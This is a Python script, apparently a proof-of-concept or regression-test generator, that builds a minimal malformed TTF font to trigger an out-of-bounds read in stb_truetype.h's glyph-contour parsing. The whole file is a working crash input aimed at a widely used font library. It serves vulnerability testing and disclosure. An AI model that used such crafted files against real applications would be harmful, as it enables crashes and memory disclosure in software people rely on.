#!/usr/bin/env python3
"""Generate a deterministic minimal TTF that triggers WEB-2026-003.

The glyph has one contour with one point. That point is marked as off-curve.
In vulnerable stb_truetype.h, stbtt__GetGlyphShapeTT reads vertices[off+i+1]
for contour-start off-curve handling when i==n-1, causing one-past-end read.
"""

import struct
from pathlib import Path

OUT = Path(__file__).with_name("malformed_contour_oob.ttf")


def u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def i16(x: int) -> bytes:
    return struct.pack(">h", x)


def u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def pad4(data: bytes) -> bytes:
    return data + (b"\0" * ((4 - (len(data) % 4)) % 4))


# cmap format 0; maps all byte code points to glyph 0.
cmap_subtable = u16(0) + u16(262) + u16(0) + bytes(256)
cmap = u16(0) + u16(1) + u16(3) + u16(1) + u32(12) + cmap_subtable

# head: short loca offsets
head = bytearray(54)
head[50:52] = u16(0)  # indexToLocFormat = short

# hhea/hmtx/maxp minimal requirements
hhea = bytearray(36)
hhea[34:36] = u16(1)  # numOfLongHorMetrics
hmtx = bytes(4)       # one long metric
maxp = u32(0x00010000) + u16(1)  # one glyph

# Glyph 0 (simple glyph):
# numberOfContours = 1
# endPtsOfContours[0] = 0 (n = 1 point)
# instructionLength = 0
# flags[0] = 0x30 (off-curve, x-is-same, y-is-same => no x/y coordinate bytes)
# padding byte added so short loca length/2 is integral.
glyf = (
    i16(1) +            # numberOfContours
    i16(0) + i16(0) + i16(0) + i16(0) +  # bbox
    u16(0) +            # endPtsOfContours[0]
    u16(0) +            # instructionLength
    bytes([0x30]) +     # flags[0]
    b"\x00"            # pad to even length for short loca
)

# loca short offsets (offset / 2)
loca = u16(0) + u16(len(glyf) // 2)

tables = [
    ("cmap", cmap),
    ("glyf", glyf),
    ("head", bytes(head)),
    ("hhea", bytes(hhea)),
    ("hmtx", hmtx),
    ("loca", loca),
    ("maxp", maxp),
]

num_tables = len(tables)
max_pow2 = 1
entry_selector = 0
while (max_pow2 << 1) <= num_tables:
    max_pow2 <<= 1
    entry_selector += 1
search_range = max_pow2 * 16
range_shift = (num_tables * 16) - search_range

offset_table = (
    u32(0x00010000) +
    u16(num_tables) +
    u16(search_range) +
    u16(entry_selector) +
    u16(range_shift)
)

directory_len = 16 * num_tables
current_offset = len(offset_table) + directory_len
records = []
blobs = []

for tag, data in tables:
    padded = pad4(data)
    records.append(tag.encode("ascii") + u32(0) + u32(current_offset) + u32(len(data)))
    blobs.append(padded)
    current_offset += len(padded)

font_data = offset_table + b"".join(records) + b"".join(blobs)
OUT.write_bytes(font_data)
print(f"wrote {OUT} ({len(font_data)} bytes)")
